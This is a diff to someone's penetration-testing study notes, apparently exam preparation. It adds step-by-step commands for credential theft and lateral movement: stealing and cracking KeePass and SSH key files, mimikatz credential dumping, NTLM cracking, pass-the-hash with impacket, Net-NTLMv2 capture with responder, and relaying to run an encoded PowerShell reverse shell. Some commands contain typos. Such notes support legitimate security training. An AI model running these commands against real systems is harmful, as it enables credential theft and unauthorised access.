@@ -154,10 +154,53 @@ use the following website for the rainbow table attack
 -     Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 - share/copy the keepass file to kali machine
 -     copy .\Documents\Database.kdbx \\<IP>\share\Database.kdbx
-- crake the pass using keepass2john
+- crake the pass using keepass2john 
 -     keepass2john <keepass file> > keepass.hash
+- know the mode number of the hashcat
+-     hashcat -h | grep -i "keepass"
 - don't forget to delete the file name at the beginning of the file then use hashcat to crack the hash
 -     hashcat -m 13400  <keepass.hash> <password list> -r <rule file> --force
+- cracking ssh private key passphrase by john
+- - transfer the ssh private key to hash
+-     ssh2john id_rsa > ssh.hash
+- then you need to set a rule in the beginning of the pass file. rule of the ssh is [List.Rules:sshRules] then append this rule to the JTR configuration file using the following command
+-     sudo sh -c 'cat /home/kali/ssh.rule >> /etc/john/john.conf'
+-     john --wordlist=<wordlist> --rules=sshRules ssh.hash
+- cracking NTLM hashes
+- first you need to retrieve the password from sam database
+-     pritvilege::debug
+-     token::elevate
+-     sekurlsa::logonpasswords 'OR use' lsadump::sam
+- NTLM mode in hashcat
+-     hashcat -h | grep -i "ntlm"
+- use hashcat to crack the password
+-     hashcat -m 1000 <ntlmhash.hash> rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+- passing NTLM to connect to smb shares
+-     \\\\<IP>\\<ShareName> -U Administrator --pw-nt-hash <NTLM_hash>
+-  impacket-psexec: will always give you a system shell. impacket-wmiexec: will give you a user shell
+- passing NTLM to obtain a shell. if you don't have NL hash you can fill it wil 32 zeros
+-     impacket-psexec -hashes NL:NTLM Administrator@<IP>
+-     impacket-psexec -hashes 00000000000000000000000000000000:NTLM Administrator@<IP>
+-     impacket-wmiexec -hashes NL:NTLM Administrator@<IP>
+- if you get access to an unprivileged machine you may can't use mimikatz to dump the NTLM hash. in this case you need to crake Net-NTLMv2 by setting smb server and use responder to capture Net-NTLM hash
+- first use ip a command to check the IP and interface of the machine
+-     ip a
+- secondly, run responder
+-     sudo responder -I <interface>
+- from the target machine list any smb share to get the authentication from the responder
+-     dir \\<Kali_IP>\test 'Note: this will give access denied. go and check the output of responder'
+- save the output to file.hash and check the correct mode
+-     hashcat -m 5600 <file.hash> rockyou.txt --force
+- Relaying the hash (pass the Net-NTLM hash). used if you can't crack the NTLM hash
+- first, send a reverse shell typed by powershell and encoded by base64
+-     sudo impacket-ntlmrelayx --no-http-server -smb2support -t <IP> -c "powershell -enc <payload>"
+- secondly, use nc to listed on port 8080
+- thirdly, using cmd that is connected to the target machine, send smb authentication
+-     dir \\<Kali_IP>\test
+- fourthly, you will receive a connection on the nc listener
+- 
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Platforms
 1. for Initial Access work on eJPT, This article and official content 
 Windows Privilege Escalation use TCM security, official content, YouTube videos
